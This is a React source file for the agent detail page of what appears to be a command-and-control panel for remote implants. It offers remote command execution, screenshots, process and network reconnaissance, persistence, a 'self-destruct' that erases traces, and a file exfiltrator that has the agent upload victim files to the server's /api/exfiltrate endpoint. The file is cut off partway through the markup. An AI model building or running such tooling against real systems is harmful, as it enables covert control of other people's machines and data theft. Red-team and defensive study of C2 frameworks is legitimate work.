import React, { useState, useEffect, useRef, useCallback, useMemo } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { 
  Terminal as TerminalIcon, 
  Cpu, 
  Globe, 
  Clock, 
  ChevronLeft, 
  Send,
  Loader2,
  CheckCircle2,
  AlertCircle,
  FileText,
  Trash2,
  Zap,
  Folder,
  ChevronRight,
  HardDrive,
  Wifi,
  RefreshCw,
  ArrowDown,
  MousePointer2,
  Monitor,
  ShieldCheck,
  ShieldAlert,
  Bomb,
  Download,
  Activity as ActivityIcon
} from 'lucide-react';
import { agentsApi, tasksApi } from '../utils/api';
import { format, formatDistanceToNow } from 'date-fns';

const AgentDetailPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [command, setCommand] = useState('');
  const [executing, setExecuting] = useState(false);
  const [activeTab, setActiveTab] = useState('console');
  const [psSearchQuery, setPsSearchQuery] = useState('');
  const [netSearchQuery, setNetSearchQuery] = useState('');
  const [fileSearchQuery, setFileSearchQuery] = useState('');
  const [commandHistory, setCommandHistory] = useState([]);
  const [historyIndex, setHistoryIndex] = useState(-1);
  const [toasts, setToasts] = useState([]);
  const [pendingTasks, setPendingTasks] = useState([]);
  const [autoScroll, setAutoScroll] = useState(true);
  const [lastClearedResultId, setLastClearedResultId] = useState(() => {
    return localStorage.getItem(`clear_id_${id}`);
  });
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [prevPsList, setPrevPsList] = useState([]);
  const [prevNetList, setPrevNetList] = useState([]);
  const lastResultsLength = useRef(0);
  const resultEndRef = useRef(null);

  const addToast = useCallback((title, type = 'info') => {
    const id = Date.now();
    setToasts(prev => [...prev, { id, title, type }]);
    setTimeout(() => {
      setToasts(prev => prev.filter(t => t.id !== id));
    }, 4000);
  }, []);


  const fetchDetails = useCallback(async () => {
    try {
      const details = await agentsApi.get(id);
      setData(details);
      
      // Clean up pending tasks and notify
      setPendingTasks(prev => {
        const now = new Date();
        const results = details.results || [];
        
        // 1. Find completed tasks
        const completed = prev.filter(pt => 
          results.some(r => String(r.task_id) === String(pt.id))
        );
        
        completed.forEach(task => {
          const result = results.find(r => String(r.task_id) === String(task.id));
          addToast(
            `Task ${task.task_type.replace('_json', '')} ${result.status === 'success' ? 'completed' : 'failed'}`, 
            result.status === 'success' ? 'success' : 'error'
          );
        });

        // 2. Filter out completed and stale tasks
        return prev.filter(pt => {
          const isCompleted = results.some(r => String(r.task_id) === String(pt.id));
          const isStale = (now - new Date(pt.created_at)) > 30000;
          
          if (isStale && !isCompleted) {
            addToast(`Task ${pt.task_type} timed out`, 'error');
          }
          
          return !isCompleted && !isStale;
        });
      });
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  }, [id, addToast]);

  useEffect(() => {
    let isMounted = true;
    
    const init = async () => {
      if (isMounted) {
        await fetchDetails();
      }
    };

    init();
    const interval = setInterval(fetchDetails, 3000); // Faster refresh for better UX
    
    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, [fetchDetails]);

  const handleQuickAction = useCallback(async (type, payload) => {
    const targetType = type === 'ls' ? 'ls_json' : type;
    try {
      const result = await tasksApi.create(id, targetType, payload);

      // Add to pending for immediate feedback
      const taskObj = result.task || result;
      const pushed = result.pushed;

      if (pushed) {
        addToast(`Real-time dispatch: ${targetType.replace('_json', '')}`, 'success');
      }

      setPendingTasks(prev => [...prev, {
        id: taskObj.id,
        task_type: targetType,
        task_payload: JSON.stringify(payload),
        status: 'pending',
        created_at: new Date().toISOString(),
        pushed: pushed
      }]);
      
      // Trigger immediate refresh
      fetchDetails();
      
      return result;

    } catch (err) {
      alert(err.message);
    }
  }, [id, fetchDetails]);

  // Real-Time Heartbeat Monitor
  useEffect(() => {
    if (!isMonitoring) return;

    const monitor = setInterval(() => {
      if (activeTab === 'processes') {
        handleQuickAction('ps_json', {});
      } else if (activeTab === 'network') {
        handleQuickAction('netstat_json', {});
      }
    }, 5000);

    return () => clearInterval(monitor);
  }, [isMonitoring, activeTab, id, handleQuickAction]);

  useEffect(() => {
    const newLength = (data?.results?.length || 0) + pendingTasks.length;
    if (newLength > lastResultsLength.current) {
      if (autoScroll && activeTab === 'console') {
        resultEndRef.current?.scrollIntoView({ behavior: 'smooth' });
      }
      lastResultsLength.current = newLength;
    }
  }, [data?.results, pendingTasks.length, autoScroll, activeTab]);

  const handleExfiltrate = async (file) => {
    try {
      const fullPath = joinPath(getLatestLsResult()?.path, file.name);
      const serverUrl = window.location.origin;
      
      const result = await tasksApi.create(id, 'upload_url', { 
        path: fullPath,
        url: `${serverUrl}/api/exfiltrate/${id}/__TASK_ID__/${file.name}`
      });

      const taskObj = result.task || result;
      addToast(`Exfiltration mission started: ${file.name}`, 'info');
      
      setPendingTasks(prev => [...prev, {
        id: taskObj.id,
        task_type: 'exfiltration',
        task_payload: JSON.stringify({ path: fullPath }),
        status: 'pending',
        created_at: new Date().toISOString()
      }]);

      fetchDetails();
    } catch (err) {
      console.error(err);
      addToast('Exfiltration failed to initialize', 'error');
    }
  };

  const handleKillAgent = async () => {
    if (window.confirm('Are you sure you want to terminate this agent? It will no longer respond to beacons.')) {
      try {
        await agentsApi.kill(id);
        navigate('/agents');
      } catch (err) {
        alert(err.message);
      }
    }
  };

  const handleCommand = async (e) => {
    e.preventDefault();
    if (!command.trim() || executing) return;

    setExecuting(true);
    try {
      const result = await tasksApi.create(id, 'execute_command', { command });
      
      // Add to pending for immediate console feedback
      const taskObj = result.task || result;
      setPendingTasks(prev => [...prev, {
        id: taskObj.id,
        task_type: 'execute_command',
        task_payload: JSON.stringify({ command }),
        status: 'pending',
        created_at: new Date().toISOString()
      }]);

      setCommandHistory(prev => [command, ...prev].slice(0, 50));
      setHistoryIndex(-1);
      setCommand('');
      addToast(`Command dispatched: ${command.split(' ')[0]}`, 'success');
      
      // Immediate refresh
      fetchDetails();
    } catch (err) {
      console.error(err);
      addToast('Failed to dispatch command', 'error');
    } finally {
      setExecuting(false);
    }
  };

  const handleKeyDown = (e) => {
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (historyIndex < commandHistory.length - 1) {
        const nextIndex = historyIndex + 1;
        setHistoryIndex(nextIndex);
        setCommand(commandHistory[nextIndex]);
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex > -1) {
        const nextIndex = historyIndex - 1;
        setHistoryIndex(nextIndex);
        setCommand(nextIndex === -1 ? '' : commandHistory[nextIndex]);
      }
    }
  };

  const renderOutput = (res) => {
    const output = res.output;
    if (res.output && res.output.startsWith('SCREENSHOT:')) {
      const dataUri = res.output.replace('SCREENSHOT:', '');
      return (
        <div className="space-y-2">
          <div className="text-slate-400 text-xs italic italic">Screenshot captured</div>
          <img 
            src={dataUri} 
            alt="Screenshot" 
            className="rounded-lg border border-slate-800 max-w-full hover:scale-105 transition-transform cursor-zoom-in" 
            onClick={() => window.open(dataUri)}
          />
        </div>
      );
    }

    if (res.output && res.output.startsWith('FILE_EXFILTRATED:')) {
      const fullPath = res.output.replace('FILE_EXFILTRATED:', '');
      const filename = fullPath.split(/[\\/]/).pop().split('_').slice(1).join('_');
      const fileBasename = fullPath.split(/[\\/]/).pop();
      
      return (
        <div className="p-4 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-between group">
          <div className="flex items-center gap-4">
            <div className="p-3 bg-primary/20 rounded-xl text-primary group-hover:scale-110 transition-transform">
              <Download className="w-6 h-6" />
            </div>
            <div>
              <div className="text-[10px] font-black text-primary uppercase tracking-[0.2em] mb-1">Target Intelligence Acquired</div>
              <div className="text-sm font-bold text-white">{filename}</div>
            </div>
          </div>
          <button 
            onClick={async () => {
              try {
                const response = await tasksApi.download(id, fileBasename);
                if (!response.ok) {
                  const errorData = await response.json().catch(() => ({}));
                  throw new Error(errorData.error || `Server returned ${response.status}`);
                }
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
              } catch (err) {
                console.error('Download error:', err);
                alert(`Download failed: ${err.message}`);
              }
            }}
            className="px-6 py-2.5 rounded-xl bg-primary text-white text-[10px] font-black uppercase tracking-[0.2em] hover:bg-primary-hover transition-all shadow-lg shadow-primary/20"
          >
            Download to Local
          </button>
        </div>
      );
    }

    // Binary Detection for 'cat' commands
    if (res.task_type === 'cat' && output && (output.startsWith('%PDF-') || output.includes(''))) {
      const payload = typeof res.task_payload === 'string' ? JSON.parse(res.task_payload) : (res.task_payload || {});
      const fileName = payload.path ? payload.path.split(/[\\/]/).pop() : 'Binary File';
      
      // Generate a hex preview of the first 256 bytes (or whatever is in the output)
      const generateHexPreview = (text) => {
        const hex = [];
        const chars = [];
        const maxLen = Math.min(text.length, 256);
        
        for (let i = 0; i < maxLen; i++) {
          const charCode = text.charCodeAt(i);
          hex.push(charCode.toString(16).padStart(2, '0').toUpperCase());
          chars.push(charCode >= 32 && charCode <= 126 ? text[i] : '.');
        }
        
        const rows = [];
        for (let i = 0; i < hex.length; i += 16) {
          const hexRow = hex.slice(i, i + 16).join(' ');
          const charRow = chars.slice(i, i + 16).join('');
          rows.push(`${(i).toString(16).padStart(8, '0')}  ${hexRow.padEnd(47)}  |${charRow}|`);
        }
        return rows.join('\n');
      };

      return (
        <div className="p-6 rounded-2xl bg-amber-500/10 border border-amber-500/20 flex flex-col gap-6">
          <div className="flex items-center gap-4">
            <div className="p-3 bg-amber-500/20 rounded-xl text-amber-500">
              <AlertCircle className="w-6 h-6" />
            </div>
            <div>
              <div className="text-[10px] font-black text-amber-500 uppercase tracking-[0.2em] mb-1">Binary Stream Detected</div>
              <div className="text-sm font-bold text-white">Console cannot render raw binary data for: {fileName}</div>
            </div>
          </div>

          <div className="space-y-2">
             <div className="text-[9px] font-black text-slate-500 uppercase tracking-widest pl-1">Hex Intelligence Preview (First 256 Bytes)</div>
             <pre className="p-4 bg-black/60 rounded-xl border border-slate-800/50 font-mono text-[10px] text-emerald-500/80 leading-relaxed overflow-x-auto shadow-inner">
               {generateHexPreview(output)}
             </pre>
          </div>

          <div className="flex gap-3">
            <button 
              onClick={() => handleExfiltrate({ name: fileName })}
              className="px-6 py-2.5 rounded-xl bg-amber-500 text-black text-[10px] font-black uppercase tracking-[0.2em] hover:bg-amber-400 transition-all shadow-lg shadow-amber-500/20 flex items-center gap-2"
            >
              <Download className="w-3.5 h-3.5" /> Full Exfiltration
            </button>
            <div className="flex-1 p-3 bg-black/40 rounded-xl font-mono text-[10px] text-slate-500 border border-slate-800">
              Binary data detected. Use exfiltration to retrieve the full asset for local analysis.
            </div>
          </div>
        </div>
      );
    }

    return (
      <pre className="whitespace-pre-wrap text-slate-300 bg-slate-900/50 p-3 rounded-lg border border-slate-800 overflow-x-auto font-mono text-[11px] leading-relaxed">
        {res.output || (res.error ? `ERROR: ${res.error}` : 'No output')}
      </pre>
    );
  };

  const psList = useMemo(() => {
    const results = data?.results || [];
    const res = [...results].reverse().find(r => r.task_type === 'ps_json' && r.status === 'success');
    try { return res ? JSON.parse(res.output) : null; } catch { return null; }
  }, [data?.results]);

  const netList = useMemo(() => {
    const results = data?.results || [];
    const res = [...results].reverse().find(r => r.task_type === 'netstat_json' && r.status === 'success');
    try { return res ? JSON.parse(res.output) : null; } catch { return null; }
  }, [data?.results]);

  useEffect(() => {
    if (psList) {
      setPrevPsList(curr => {
        if (JSON.stringify(curr) !== JSON.stringify(psList)) {
          return curr.length === 0 ? psList : curr;
        }
        return curr;
      });
    }
  }, [psList]);

  useEffect(() => {
    if (netList) {
      setPrevNetList(curr => {
        if (JSON.stringify(curr) !== JSON.stringify(netList)) {
          return curr.length === 0 ? netList : curr;
        }
        return curr;
      });
    }
  }, [netList]);

  if (!data) {
    return (
      <div className="h-full flex items-center justify-center bg-[#05070a]">
        {loading ? (
          <div className="flex flex-col items-center gap-4">
            <Loader2 className="w-8 h-8 text-primary animate-spin" />
            <p className="text-[10px] font-black text-slate-500 uppercase tracking-[0.3em]">Synchronizing Intelligence...</p>
          </div>
        ) : (
          <div className="flex flex-col items-center gap-6 p-12 rounded-3xl bg-red-500/5 border border-red-500/10">
            <AlertCircle className="w-12 h-12 text-red-500/50" />
            <div className="text-center">
              <h3 className="text-white font-bold mb-2">Intelligence Retrieval Failed</h3>
              <p className="text-xs text-slate-500 max-w-xs">Unable to establish secure link with node. The asset may be offline or the session has expired.</p>
            </div>
            <button 
              onClick={() => navigate('/agents')}
              className="px-6 py-2.5 rounded-xl bg-slate-900 border border-slate-800 text-slate-300 text-[10px] font-black uppercase tracking-widest hover:bg-slate-800 transition-all"
            >
              Return to Command Center
            </button>
          </div>
        )}
      </div>
    );
  }

  const { agent, results } = data;


  const getLatestPsResult = () => psList;
  const getLatestNetstatResult = () => netList;

  const getLatestLsResult = () => {
    const lsRes = [...results].reverse().find(r => r.task_type === 'ls_json' && r.status === 'success');
    if (!lsRes) return null;
    try {
      return JSON.parse(lsRes.output);
    } catch {
      return null;
    }
  };

  const formatFileSize = (bytes) => {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  const joinPath = (base, addition) => {
    if (!base || base === '.') return addition;
    const isWindows = base.includes('\\') || (agent.os === 'windows');
    const separator = isWindows ? '\\' : '/';
    
    // Clean up base
    let cleanBase = base;
    if (cleanBase.endsWith(separator)) {
      cleanBase = cleanBase.slice(0, -1);
    }
    
    return `${cleanBase}${separator}${addition}`;
  };


  return (
    <div className="flex-1 h-full overflow-hidden flex flex-col bg-[#05070a]">
      {/* Top Intelligence Strip */}
      <div className="shrink-0 h-16 border-b border-slate-800/50 bg-slate-900/20 backdrop-blur-md flex items-center justify-between px-8 z-30">
        <div className="flex items-center gap-6">
          <button 
            onClick={() => navigate(-1)}
            className="p-2 rounded-xl hover:bg-white/5 text-slate-500 hover:text-white transition-all group"
          >
            <ChevronLeft className="w-5 h-5 group-hover:-translate-x-0.5 transition-transform" />
          </button>
          
          <div className="h-8 w-px bg-slate-800/50" />

          <div>
            <h1 className="text-sm font-black text-white tracking-wider font-mono uppercase">NODE::{agent.hostname}</h1>
            <p className="text-[10px] font-bold text-slate-500 font-mono mt-0.5 uppercase tracking-tighter opacity-50 truncate max-w-[200px]">{agent.id}</p>
          </div>
        </div>

        <div className="flex items-center gap-12">
          <div className="hidden xl:flex flex-col items-end border-r border-slate-800 pr-12">
            <span className="text-[9px] font-bold text-slate-600 uppercase tracking-widest mb-1">Status Intelligence</span>
            <div className="flex items-center gap-3">
              <div className={`px-2 py-0.5 rounded text-[10px] font-black uppercase tracking-widest ${
                agent.connection_status === 'online' ? 'bg-success/10 text-success' : 'bg-slate-800 text-slate-500'
              }`}>
                {agent.connection_status}
              </div>
              {agent.is_online_ws && (
                <div className="px-2 py-0.5 rounded bg-primary/10 text-primary text-[10px] font-black uppercase tracking-widest flex items-center gap-1 animate-pulse">
                  <Zap className="w-2.5 h-2.5" />
                  Real-time
                </div>
              )}
              <div className="w-1.5 h-1.5 rounded-full bg-slate-800" />
              <span className="text-[11px] font-mono text-slate-400">{agent.ip_address || '0.0.0.0'}</span>

            </div>
          </div>

          <div className="flex flex-col items-end">
            <span className="text-[9px] font-bold text-slate-600 uppercase tracking-widest mb-1">Last Contact</span>
            <div className="flex items-center gap-2">
              <Clock className="w-3 h-3 text-slate-600" />
              <span className="text-[11px] font-mono text-slate-300">
                {agent.last_seen ? formatDistanceToNow(new Date(agent.last_seen), { addSuffix: true }) : 'Never'}
              </span>
            </div>
          </div>

          <div className="h-10 w-px bg-slate-800 mx-2" />

          <button 
            onClick={handleKillAgent}
            className="px-6 py-2.5 rounded-xl bg-red-500/10 text-red-500 hover:bg-red-500 hover:text-white transition-all border border-red-500/20 font-black text-[10px] uppercase tracking-[0.2em] shadow-lg shadow-red-500/5"
          >
            Kill Node
          </button>
        </div>
      </div>

      {/* Main Content Area */}
      <div className="flex-1 flex overflow-hidden">
        {/* Left Sidebar: Asset Intelligence */}
        <div className="w-80 border-r border-slate-800/50 flex flex-col bg-slate-900/10 overflow-y-auto scrollbar-thin">
          <div className="p-6 space-y-6">
            {/* System Specs */}
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-black text-slate-500 uppercase tracking-[0.2em]">Asset Intelligence</span>
                <ShieldCheck className="w-3.5 h-3.5 text-primary/50" />
              </div>
              
              <div className="space-y-2">
                {[
                  { label: 'OS Platform', value: agent.os, icon: Monitor },
                  { label: 'Architecture', value: agent.arch, icon: Cpu },
                  { label: 'Process ID', value: agent.pid, icon: ActivityIcon },
                  { label: 'Integrity', value: 'Level 4 (System)', icon: ShieldCheck },
                ].map((item, i) => (
                  <div key={i} className="flex items-center justify-between p-3 rounded-xl bg-slate-900/40 border border-slate-800/50 group hover:border-primary/20 transition-all">
                    <div className="flex items-center gap-3">
                      <item.icon className="w-3.5 h-3.5 text-slate-600 group-hover:text-primary transition-colors" />
                      <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">{item.label}</span>
                    </div>
                    <span className="text-[11px] font-mono text-white/80">{item.value}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* Tactical Actions */}
            <div className="space-y-4 pt-4 border-t border-slate-800/50">
              <span className="text-[10px] font-black text-slate-500 uppercase tracking-[0.2em]">Quick Dispatch</span>
              <div className="grid grid-cols-2 gap-2">
                {[
                  { label: 'Screenshot', icon: Monitor, type: 'screenshot' },
                  { label: 'Shell Info', icon: TerminalIcon, type: 'system_info' },
                  { label: 'Net Check', icon: Wifi, type: 'netstat_json' },
                  { label: 'Process Sc', icon: Cpu, type: 'ps_json' },
                ].map((action, i) => (
                  <button
                    key={i}
                    onClick={() => handleQuickAction(action.type, {})}
                    className="flex flex-col items-center justify-center gap-3 p-4 rounded-xl bg-slate-900/40 border border-slate-800/50 hover:border-primary/40 hover:bg-primary/5 transition-all group"
                  >
                    <action.icon className="w-5 h-5 text-slate-500 group-hover:text-primary transition-colors" />
                    <span className="text-[10px] font-bold text-slate-500 group-hover:text-slate-300 uppercase tracking-widest">{action.label}</span>
                  </button>
                ))}
              </div>
            </div>

            {/* Advanced Operations */}
            <div className="space-y-4 pt-4 border-t border-slate-800/50">
              <span className="text-[10px] font-black text-slate-500 uppercase tracking-[0.2em]">High-Risk Ops</span>
              <div className="grid grid-cols-2 gap-2">
                <button
                  onClick={() => handleQuickAction('persist', {})}
                  className="flex items-center gap-3 p-3 rounded-xl bg-slate-900/40 border border-slate-800/50 hover:border-emerald-500/40 hover:bg-emerald-500/5 transition-all group"
                >
                  <ShieldAlert className="w-4 h-4 text-slate-500 group-hover:text-emerald-500 transition-colors" />
                  <span className="text-[10px] font-bold text-slate-500 group-hover:text-slate-300 uppercase tracking-widest">Persist</span>
                </button>
                <button
                  onClick={() => {
                    if(confirm('WARNING: Self-destruct will remove the agent binary and all traces from the target system. Proceed?')) {
                      handleQuickAction('self_destruct', {});
                    }
                  }}
                  className="flex items-center gap-3 p-3 rounded-xl bg-slate-900/40 border border-slate-800/50 hover:border-red-500/40 hover:bg-red-500/5 transition-all group"
                >
                  <Bomb className="w-4 h-4 text-slate-500 group-hover:text-red-500 transition-colors" />
                  <span className="text-[10px] font-bold text-slate-500 group-hover:text-slate-300 uppercase tracking-widest">Purge</span>
                </button>
              </div>
            </div>

            {/* Mission Intelligence (Notes & Tags) */}
            <div className="space-y-4 pt-4 border-t border-slate-800/50">
              <span className="text-[10px] font-black text-slate-500 uppercase tracking-[0.2em]">Mission Intelligence</span>
              
              <div className="space-y-3">
                {/* Notes */}
                <div className="relative group">
                  <div className="absolute top-3 left-3 pointer-events-none">
                    <FileText className="w-3.5 h-3.5 text-slate-600 group-focus-within:text-primary transition-colors" />
                  </div>
                  <textarea 
                    placeholder="Enter mission notes..."
                    defaultValue={(() => {
                      try {
                        return JSON.parse(agent.metadata || '{}').notes || '';
                      } catch { return ''; }
                    })()}
                    onBlur={async (e) => {
                      const notes = e.target.value;
                      let metadata = {};
                      try { 
                        metadata = JSON.parse(agent.metadata || '{}'); 
                      } catch {
                        /* ignore parsing error */
                      }
                      if (metadata.notes === notes) return;
                      metadata.notes = notes;
                      await agentsApi.updateMetadata(id, metadata);
                      addToast('Mission notes synchronized', 'success');
                    }}
                    className="w-full bg-slate-900/40 border border-slate-800/50 rounded-xl pl-10 pr-4 py-3 text-[11px] text-slate-300 outline-none focus:border-primary/30 min-h-[100px] resize-none font-sans"
                  />
                </div>

                {/* Tags */}
                <div className="flex flex-wrap gap-2">
                  {(() => {
                    let tags = [];
                    try { 
                      tags = JSON.parse(agent.metadata || '{}').tags || []; 
                    } catch { 
                      /* ignore parsing error */
                    }
                    return (
                      <>
                        {tags.map((tag, i) => (
                          <span key={i} className="px-2 py-0.5 rounded-lg bg-primary/10 border border-primary/20 text-[9px] font-black text-primary uppercase tracking-widest flex items-center gap-1.5">
                            {tag}
                            <button 
                              onClick={async () => {
                                let metadata = {};
                                try { 
                                  metadata = JSON.parse(agent.metadata || '{}'); 
                                } catch {
                                  /* ignore parsing error */
                                }
                                metadata.tags = (metadata.tags || []).filter(t => t !== tag);
                                await agentsApi.updateMetadata(id, metadata);
                                fetchDetails();
                              }}
                              className="hover:text-white"
                            >
                              ×
                            </button>
                          </span>
                        ))}
                        <button 
                          onClick={() => {
                            const tag = prompt('Enter new tag:');
                            if (tag) {
                              (async () => {
                                let metadata = {};
                                try { 
                                  metadata = JSON.parse(agent.metadata || '{}'); 
                                } catch {
                                  /* ignore parsing error */
                                }
                                metadata.tags = [...(metadata.tags || []), tag];
                                await agentsApi.updateMetadata(id, metadata);
                                fetchDetails();
                              })();
                            }
                          }}
                          className="px-2 py-0.5 rounded-lg border border-slate-800 border-dashed text-[9px] font-black text-slate-600 uppercase tracking-widest hover:border-slate-600 hover:text-slate-400 transition-all"
                        >
                          + Add Tag
                        </button>
                      </>
                    );
                  })()}
                </div>

              </div>
            </div>

            {/* Health Monitor */}
            <div className="p-4 rounded-2xl bg-emerald-500/5 border border-emerald-500/10">
              <div className="flex items-center justify-between mb-3">
                <span className="text-[10px] font-black text-emerald-500/70 uppercase tracking-widest">Connectivity</span>
                <Wifi className="w-3.5 h-3.5 text-emerald-500/50" />
              </div>
              <div className="h-1.5 w-full bg-emerald-500/10 rounded-full overflow-hidden">
                <div className="h-full bg-emerald-500 w-full animate-pulse shadow-[0_0_8px_rgba(16,185,129,0.5)]" />
              </div>
              <p className="text-[9px] text-emerald-500/60 font-bold mt-2 uppercase tracking-tighter">Stable Beacon • {agent.beacon_interval}s Interval</p>
            </div>
          </div>
        </div>

        {/* Right Module: Interaction Workspace */}
        <div className="flex-1 flex flex-col min-w-0 bg-slate-950/20">
          {/* Module Navigation */}
          <div className="h-12 border-b border-slate-800/50 bg-slate-900/40 flex items-center px-6 gap-8 shrink-0">
            {[
              { id: 'console', label: 'Tactical Console', icon: TerminalIcon },
              { id: 'processes', label: 'Process Audit', icon: Cpu },
              { id: 'files', label: 'File Exfiltrator', icon: Folder },
              { id: 'network', label: 'Network Graph', icon: Globe },
            ].map(tab => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-2 h-full border-b-2 transition-all ${
                  activeTab === tab.id 
                    ? 'border-primary text-white' 
                    : 'border-transparent text-slate-500 hover:text-slate-300'
                }`}
              >
                <tab.icon className={`w-3.5 h-3.5 ${activeTab === tab.id ? 'text-primary' : 'text-slate-600'}`} />
                <span className="text-[10px] font-black uppercase tracking-[0.15em]">{tab.label}</span>
              </button>
            ))}
          </div>

          {/* Module Content */}
          <div className="flex-1 overflow-hidden relative flex flex-col">
            {activeTab === 'console' && (
              <div className="card flex-1 flex flex-col overflow-hidden relative border-slate-800/50 bg-slate-950/40">
              <div className="p-5 border-b border-slate-800 flex items-center justify-between bg-slate-900/40 shrink-0">
                <div className="flex items-center gap-3">
                  <div className="p-2 bg-primary/10 rounded-lg border border-primary/20">
                    <TerminalIcon className="w-4 h-4 text-primary" />
                  </div>
                  <span className="text-sm font-bold text-white">Live Session</span>
                </div>
                <div className="flex items-center gap-6">
                  <label className="flex items-center gap-2 cursor-pointer group">
                    <input 
                      type="checkbox" 
                      checked={autoScroll} 
                      onChange={(e) => setAutoScroll(e.target.checked)}
                      className="hidden"
                    />
                    <div className={`w-8 h-4 rounded-full transition-all relative ${autoScroll ? 'bg-primary' : 'bg-slate-700'}`}>
                      <div className={`absolute top-1 w-2 h-2 bg-white rounded-full transition-all ${autoScroll ? 'left-5' : 'left-1'}`} />
                    </div>
                    <span className="text-xs text-slate-500 uppercase font-bold group-hover:text-slate-300">Auto-Scroll</span>
                  </label>
                  <div className="h-4 w-px bg-slate-800 mx-2" />
                  <div className="flex items-center gap-2 text-xs font-bold text-slate-500 uppercase tracking-wider">
                    <span className="w-2 h-2 rounded-full bg-success animate-pulse" />
                    {agent.beacon_interval}s interval
                  </div>
                  <div className="h-4 w-px bg-slate-800 mx-2" />
                  <button 
                    onClick={() => {
                      if(confirm('Clear console output?')) {
                        const lastId = results.length > 0 ? results[results.length - 1].id : null;
                        setLastClearedResultId(lastId);
                        if (lastId) {
                          localStorage.setItem(`clear_id_${id}`, lastId);
                        }
                        addToast('Console cleared', 'info');
                      }
                    }}
                    className="p-1.5 rounded hover:bg-white/5 text-slate-500 hover:text-white transition-colors flex items-center gap-2 group"
                  >
                    <Trash2 className="w-3.5 h-3.5 group-hover:text-error transition-colors" />
                    <span className="text-[10px] font-bold uppercase tracking-widest">Clear</span>
                  </button>
                </div>
              </div>
              
              <div className="flex-1 overflow-y-auto p-4 space-y-3 font-mono scrollbar-thin bg-black/40">
                {(() => {
                  const clearIndex = lastClearedResultId ? results.findIndex(r => r.id === lastClearedResultId) : -1;
                  let visibleResults = results;
                  if (lastClearedResultId) {
                    visibleResults = clearIndex !== -1 ? results.slice(clearIndex + 1) : [];
                  }
                  
                  const visibleEntries = [...visibleResults, ...pendingTasks]
                    .sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
                  
                  if (visibleEntries.length === 0) {
                    return (
                      <div className="h-full flex flex-col items-center justify-center text-slate-600 opacity-20 select-none">
                        <TerminalIcon className="w-16 h-16 mb-4" />
                        <p className="text-xs uppercase tracking-[0.4em] font-bold">Awaiting Input</p>
                      </div>
                    );
                  }

                  return visibleEntries.map((res) => {
                    let payload = {};
                    try {
                      payload = typeof res.task_payload === 'string' ? JSON.parse(res.task_payload) : (res.task_payload || {});
                    } catch (e) {
                      console.warn("Failed to parse task payload", e);
                    }
                    const isPending = res.status === 'pending';
                    
                    return (
                      <div key={res.id} className={`group animate-in fade-in duration-500 ${isPending ? 'opacity-40 grayscale scale-[0.99] origin-left' : ''}`}>
                        <div className="flex items-center gap-3 text-slate-500 mb-2">
                          <span className="text-[10px] bg-slate-800/80 px-2 py-0.5 rounded text-slate-400 font-bold tracking-tighter">
                            {res.task_type.toUpperCase()}
                          </span>
                          <span className="text-[10px] opacity-50">{format(new Date(res.created_at), 'HH:mm:ss')}</span>
                          {isPending ? (
                            <Loader2 className="w-3 h-3 animate-spin text-primary" />
                          ) : res.status === 'success' ? (
                            <CheckCircle2 className="w-3 h-3 text-success/70" />
                          ) : (
                            <AlertCircle className="w-3 h-3 text-error/70" />
                          )}
                        </div>
                        <div className="pl-6 border-l-2 border-slate-800/50 group-hover:border-primary/30 transition-colors">
                          <div className="text-white/90 mb-3 flex items-center gap-2">
                            <span className="text-primary/60 font-bold">$</span>
                            <span className="font-bold tracking-tight">{payload.command || res.task_type}</span>
                            {payload.path && <span className="text-slate-600 ml-2">[{payload.path}]</span>}
                          </div>
                          {!isPending && (
                            <div className="bg-black/20 rounded-xl p-4 border border-white/5 shadow-inner">
                              {renderOutput(res)}
                            </div>
                          )}
                        </div>
                      </div>
                    );
                  });
                })()}
                <div ref={resultEndRef} />
              </div>

              {!autoScroll && (
                <button 
                  onClick={() => { setAutoScroll(true); resultEndRef.current?.scrollIntoView({ behavior: 'smooth' }); }}
                  className="absolute bottom-28 right-8 p-4 rounded-2xl bg-primary text-white shadow-2xl shadow-primary/40 animate-in zoom-in-50 duration-300 hover:scale-110 active:scale-95 transition-all z-20"
                >
                  <ArrowDown className="w-5 h-5" />
                </button>
              )}

              <form onSubmit={handleCommand} className="p-6 bg-slate-900/50 border-t border-slate-800 shrink-0">
                <div className="relative group">
                  <div className="absolute inset-y-0 left-5 flex items-center pointer-events-none">
                    <span className="text-primary font-bold text-lg">$</span>
                  </div>
                  <input
                    type="text"
                    value={command}
                    onChange={(e) => setCommand(e.target.value)}
                    onKeyDown={handleKeyDown}
                    placeholder="Enter system command..."
                    className="w-full bg-slate-950/50 border-2 border-slate-800 rounded-2xl pl-12 pr-32 py-4 text-white outline-none focus:border-primary/50 focus:bg-slate-950 transition-all font-mono text-base placeholder:text-slate-700"
                    disabled={executing}
                  />
                  <div className="absolute right-3 inset-y-2">
                    <button
                      type="submit"
                      disabled={executing || !command.trim()}
                      className="h-full px-6 btn-primary rounded-xl font-bold uppercase text-xs tracking-widest disabled:opacity-30 transition-all flex items-center gap-2"
                    >
                      {executing ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
                      Run
                    </button>
                  </div>
                </div>
              </form>
            </div>
          )}

          {activeTab === 'processes' && (
            <div className="card flex-1 flex flex-col overflow-hidden relative border-slate-800/50">
              <div className="p-4 border-b border-slate-800 flex items-center justify-between bg-slate-900/40 shrink-0 gap-4">
                <div className="flex items-center gap-3">
